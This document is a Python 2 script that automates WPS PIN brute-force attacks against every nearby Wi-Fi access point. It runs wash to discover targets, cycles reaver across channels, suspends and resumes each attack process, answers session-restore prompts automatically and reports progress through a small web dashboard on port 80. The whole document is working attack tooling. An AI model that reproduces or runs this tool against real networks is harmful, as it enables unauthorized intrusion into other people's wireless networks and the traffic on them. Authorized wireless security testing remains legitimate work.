#/usr/local/bin/python
import subprocess
import os
from select import select
import sys
import fcntl, os
import time
import re

import string,cgi,time
from os import curdir, sep
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import threading

INTERFACE  = "mon0"
REAVER_CMD = "./reaver_tag -i %s -b %%s -c %%d -vv" % (INTERFACE)
WASH_CMD   = "./wash -i %s" % (INTERFACE)

WASH_TIMEOUT = 60

LOG_DIR = "reaver-script-logs"

VERBOSE = 2
INFO = 1
ERROR = 0

LEVEL = 100
DISABLED = LEVEL + 1
SIGCONT = 18

PAUSE_STRING = "Reaver-script: Sleep"

CHAN_MIN = 1
CHAN_MAX = 11

MAX_TIME_PER_ITER = 300

# network status consts
DEAD = 0
SUSPENDED = 1
RUNNING = 2
PRE_RUN = -1

def debug(level, *args):
    if level<=LEVEL:
        buffer = "".join([str(i) for i in args])
        print buffer
 
def generate_handler(parent):
    main_template = file(r'main.html','r').read()
    class TinyHandler(BaseHTTPRequestHandler):
    
        def _gen_networks_table(self):
            networks = parent.get_all_networks()
            result = ""
            # chan, status, last iter duration, pin count, bssid, essid, kill
            template = """
    <tr>
        <td>%d</td>
        <td><a href="/log/%s">%s</a></td> 
        <td>%d</td> 
        <td>%d</td>    
        <td>%s</td>    
        <td>%s</td>        
        <td><a href="/kill/?/%s">x</a></td>   
    </tr>"""

            for n in networks:
                result += template % (n.channel,
                                      n.bssid,
                                      n.status_str(),
                                      n.get_last_iter_duration(),
                                      n.pin_count,
                                      n.bssid,
                                      n.essid,
                                      n.bssid)
                
            return result
            
        def handle_main(self):
            debug(VERBOSE, "handle_main")
            self.send_response(200)
            self.send_header('Content-type',	'text/html')
            self.end_headers()
            response = main_template
            response = response.replace("[start_time]", time.strftime("%H:%M:%S", time.localtime(parent.start_time)))
            response = response.replace("[total_number_of_pins]", str(parent.total_number_of_pins) )
            response = response.replace("[seconds_per_pin]", "%0.1f" % parent.get_seconds_per_pin() ) 
            response = response.replace("[networks]", self._gen_networks_table() )
            self.wfile.write(response)
            return
            
        
        def find_network_for_bssid(self, bssid):
            networks = parent.get_all_networks()
            for n in networks:
                if n.bssid == bssid:
                    return n
            raise Exception("find_network_for_bssid failed")
            
        def find_log_for_bssid(self,bssid):
            n = self.find_network_for_bssid(bssid)
            return file(n.get_log_path(),'r')
        
        def do_GET(self):
            try:
                debug(VERBOSE, "http path: %s" % self.path) 
                if self.path in ["/"]:
                    self.handle_main()
                    return
                
                
                if self.path.find("/log/")!=-1:
                    bssid = self.path.split("/")[-1]
                    f = self.find_log_for_bssid(bssid)
                    self.send_response(200)
                    self.send_header('Content-type','text')
                    self.end_headers()
                    self.wfile.write(f.read())
                    f.close()
                    return
                
                
                if self.path.find("/kill/")!=-1:
                    bssid = self.path.split("/")[-1]
                    n = self.find_network_for_bssid(bssid)
                    if n.status in [RUNNING, SUSPENDED]:
                        debug(INFO, "killing process %d" % n.p.pid)
                        n.p.terminate()
                    self.send_response(200)
                    self.send_header('Content-type','text/html')
                    f = file('redirect.html','r')
                    self.end_headers()
                    self.wfile.write(f.read())
                    f.close()
                    return                                   
                
                self.send_error(404,'Invalid request: %s' % self.path)
                    
            except IOError:
                self.send_error(404,'File Not Found: %s' % self.path)
    
    return TinyHandler
class TinyHttpServer(threading.Thread):
    def __init__(self, parent):
        self.parent = parent
        threading.Thread.__init__(self)
    
    def shutdown(self):
        self.server.shutdown()
    
    def run(self):
        try:
            self.server = HTTPServer(('', 80), generate_handler(self.parent) )
            debug(INFO,'started httpserver...')
            self.server.serve_forever()
        except KeyboardInterrupt:
            debug(ERROR, '^C received, shutting down server')
            self.server.socket.close()

class Watchdog(threading.Thread):
    def __init__(self, parent):
        debug(VERBOSE, "Watchdog init")
        self.parent = parent
        threading.Thread.__init__(self)
        self.should_stop = False
    
    def shutdown(self):
        self.should_stop = True
    
    def run(self):
        while not(self.should_stop):
            for n in self.parent.get_all_running_networks():
                if n.get_last_iter_duration() > MAX_TIME_PER_ITER:
                    n.write_to_log("REAVER_SCRIPT: iter_timeout")
                    n.p.terminate()
            time.sleep(1)
            
class ReaverScript(object):
    def __init__(self):
        self.start_time_str = time.asctime()
        self.total_number_of_pins = 0
        self.log_run_dir = os.path.join(LOG_DIR, self.start_time_str)
        self.groups = []
        self.prepare_log_dir()
    
    def get_all_networks(self):
        networks = []
        for g in self.groups:
            networks += g.networks
        return networks    
    
    def get_all_running_networks(self):
        networks = self.get_all_networks()
        return filter(lambda x: x.status == RUNNING, networks)
    
    def get_seconds_per_pin(self):
        if self.total_number_of_pins == 0:
            return -1
            
        total_time = time.time() - self.start_time
        return total_time/float(self.total_number_of_pins)
    
    def run(self):
        try:
            self.start_time = time.time()
            #buffer = file(r'wash_test.txt','rb').read() 
            buffer = self.wash()
            
            self.groups = self.parse_wash(buffer)
            
            self.server = TinyHttpServer(self)
            self.server.start()
            
            self.watchdog = Watchdog(self)
            self.watchdog.start()            
                
            for i in self.groups:
                debug(VERBOSE, repr(i))
            while True:
                for g in self.groups:
                    total_time = time.time() - self.start_time
                    if self.total_number_of_pins !=0:
                        debug(INFO, "STATS: tested %d pins, %0.1f sec/pin" % 
                             (self.total_number_of_pins, self.get_seconds_per_pin() ) )
                    if g.count()==0:
                        continue
                    g.run_loop()
                    debug(VERBOSE, repr(g))        
                    
        except KeyboardInterrupt:
            debug(ERROR, '^C received, shutting down.')
            self.server.shutdown()
            self.watchdog.shutdown()
        
        
    def prepare_log_dir(self):
        os.makedirs(self.log_run_dir)

    def parse_wash(self,buffer):
        lines = buffer.splitlines()
        first_line = -1
        for i in xrange(len(lines)):
            if lines[i].find("BSSID")!=-1:
                first_line = i+2
                break

        networks = [Network(i, self) for i in lines[first_line:]]
        groups = [Group(i, self) for i in xrange(CHAN_MIN,CHAN_MAX+1)]
        for n in networks:
            debug(VERBOSE,"adding %s to group %d" % (n, n.channel-1))
            groups[n.channel-1].add(n)
        return groups
        
    def wash(self):
        debug(INFO,"Running 'wash' for %d seconds" % WASH_TIMEOUT)
        start_time = time.time()
        p = my_popen(WASH_CMD)
        data = ""
        while (time.time() - start_time < WASH_TIMEOUT) and p.poll()==None:
            r_list, w_list, x_list = select([p.stdout, p.stderr], [], [], 0.5)
            for i in r_list:
                buffer = i.read()
                data += buffer
                if len(buffer)>0:
                    print buffer,
        
        if p.poll()!=None:
            raise Exception("wash finished ahead of time")
        p.terminate()
        #todo check return codeash 
        return data        
        
class Group(object):
    def __init__(self, channel, parent, networks=None):
        self.parent = parent
        if networks==None:
            networks = []
        self.channel = channel
        self.networks = networks
        self.last_iter_time = 0
        self.iter_count = 0
        self.avg_iter_time = 0
        self.total_run_time = 0
        
    def add(self,n):
        self.networks.append(n)
    
    def count(self):
        return len(self.networks)
    
    def __repr__(self):
        buffer = "Group: \n"
        buffer += "\tchannel : %d\n" % self.channel
        buffer += "\titer_count : %d\t" % self.iter_count
        buffer += "avg_iter_time : %d\n" % self.avg_iter_time
        for i in xrange(len(self.networks)):
            n = self.networks[i]
            buffer += "\t%d) %s\t%s\t%d\t%s\t%d\t%s\n" % (i,
                                                     n.status_str(),
                                                     n.current_pin,
                                                     n.pin_count,
                                                     n.bssid,
                                                     n.last_iter_duration,
                                                     n.essid)
        return buffer
    
    def run_loop(self):
        switch_channel(self.channel)
        self.run()
        self.select_loop()
    
    def select_loop(self):
        self.last_iter_time = 0
        self.iter_count +=1
        reverse_dict = {}

        r_wait_list = []
        for n in self.networks:
            if n.p!=None and n.p.poll()!=None:
                n.status = DEAD
            if n.status == RUNNING:
                r_wait_list.append(n.p.stdout)
                r_wait_list.append(n.p.stderr)
                reverse_dict[n.p.stdout] = n
                reverse_dict[n.p.stderr] = n             
        
        start_time = time.time()
        while len(r_wait_list):
            r_wait_list = []
            for n in self.networks:
                if n.status==RUNNING and n.p.poll()!=None:
                    n.status = DEAD
                    n.last_iter_duration = time.time() - start_time
                    
                if n.status == RUNNING:
                    r_wait_list.append(n.p.stdout)
                    r_wait_list.append(n.p.stderr)        
            r_ready, w_ready, x_ready = select(r_wait_list, [], [], 0.5)
            if len(r_ready)==0:
                debug(DISABLED,"select_loop: len(r_ready)==0") 
            for f in r_ready:
                buffer = f.read()
                n = reverse_dict[f]
                for line in buffer.splitlines():
                    n.write_to_log(line)
                    # Check for PAUSE_STRING
                    if line.find(PAUSE_STRING)!=-1:
                        debug(VERBOSE, "detected pause on %s" % n)
                        r_wait_list.remove(n.p.stdout)
                        r_wait_list.remove(n.p.stderr)
                        n.status = SUSPENDED
                        n.last_iter_duration = time.time() - start_time
                        n.suspend_time = time.time()
                        n.total_run_time += n.last_iter_duration
                        n.min_sleep_time = int(line.split(" ")[-1])
                        
                    if line.find("Trying pin")!=-1:
                        new_pin = line.split(" ")[-1]
                        if new_pin != n.current_pin:
                            n.current_pin = new_pin
                            n.pin_count += 1
                            self.parent.total_number_of_pins += 1
                    if line.find("Restore previous session for")!=-1:
                        debug(INFO,"auto restore previous session for %s" % n)
                        n.p.stdin.write("Y\n")
                        n.p.stdin.flush()
                        
        self.last_iter_time = time.time() - start_time     
        self.total_run_time += self.last_iter_time
        self.avg_iter_time = self.total_run_time / self.iter_count
        
        debug(VERBOSE, "channel %d suspended" % self.channel)
        
    
    def run(self):
        for n in self.networks:
            if time.time() - n.suspend_time < n.min_sleep_time:
                debug(VERBOSE, "time.time() - n.suspend_time < n.min_sleep_time")
                continue
            if n.p == None:
                debug(INFO, "Starting reaver on network %s" % n)
                n.p = my_popen(n.get_command())
                n.set_status_running()
            elif n.p.poll()==None:
                n.p.send_signal(SIGCONT)
                n.set_status_running()
            else:
                n.status = DEAD

class Network(object):
    def __init__(self,line, parent):
        self.parent = parent
        debug(VERBOSE, "wash: %s" % line)
        m = re.search(r'((?:(?:[A-F0-9]{2}):){5}[A-F0-9]{2}).+?([0-9]).+?(-*[0-9]+).+?([0-9]\.[0-9]).+?((?:Yes)|(?:No)).+?(\w+)', line)
        self.bssid, self.channel, self.rssi, self.version, self.locked, self.essid =  m.groups()
        self.channel = int(self.channel)
        self.rssi = int(self.rssi)
        
        self.status = PRE_RUN
        self.start_time = -1
        self.current_pin = "?"*8
        self.last_iter_duration = -1
        self.suspend_time = -1
        self.min_sleep_time = 0
        self.total_run_time = 0
        self.iter_count = 0
        if self.locked == "Yes":
            self.locked = True
        else:
            self.locked = False
        self.version = float(self.version)
        self.pin_count = 0
        self.p = None
    
    def set_status_running(self):
        self.status = RUNNING
        self.iter_count += 1    
        self.start_time = time.time()
    
    def get_last_iter_duration(self):
        if self.status == RUNNING:
            return time.time() - self.start_time
        else:
            return self.last_iter_duration
    
    def status_str(self):
        if self.status == DEAD:
            return "dead"
        elif self.status == RUNNING:
            return "running"
        elif self.status == SUSPENDED:
            return "suspended"
        elif self.status == PRE_RUN:
            return "pre_run"    
    
    def __str__(self):
        return "%s(%d)" % (self.essid, self.channel)

    def get_command(self):
        return REAVER_CMD % (self.bssid, self.channel)
        
    def __del__(self):
        if self.p != None and self.p.poll() == None:
            debug(VERBOSE, "cleaning %s" % self)
            self.p.kill()
    
    def write_to_log(self, line):
        debug(VERBOSE, "%s: %s" % (self, line) )    
        f = self.get_log_file()
        f.write(line + "\n")
        f.close()
    
    def get_log_path(self):
        filename = "%d - %s - %s" % (self.channel, self.bssid, self.essid)
        file_path = os.path.join(self.parent.log_run_dir, filename)
        return file_path
    
    def get_log_file(self):
        file_path = self.get_log_path()
        return file(file_path,'a')
   
def my_popen(command):
    p = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE, bufsize=1)
    fcntl.fcntl(p.stdout.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
    fcntl.fcntl(p.stderr.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
    return p

def switch_channel(n):
    debug(VERBOSE, "switching to channel %d." % n)
    subprocess.check_call("iwconfig %s channel %d" % (INTERFACE, n), shell=True)


r = ReaverScript()
r.run()
